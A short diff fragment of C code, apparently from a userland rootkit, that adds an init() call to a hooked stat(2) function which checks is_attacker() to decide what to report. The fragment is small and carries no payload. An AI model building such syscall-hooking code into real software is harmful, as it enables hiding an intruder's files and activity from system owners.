@@ -26,6 +26,7 @@
 #include "hooks.h" /* prototype */
 
 int stat(const char *pathname, struct stat *buf) {
+    init();
     DEBUG(D_INFO, "called stat(2) hook");
 
     if (is_attacker())
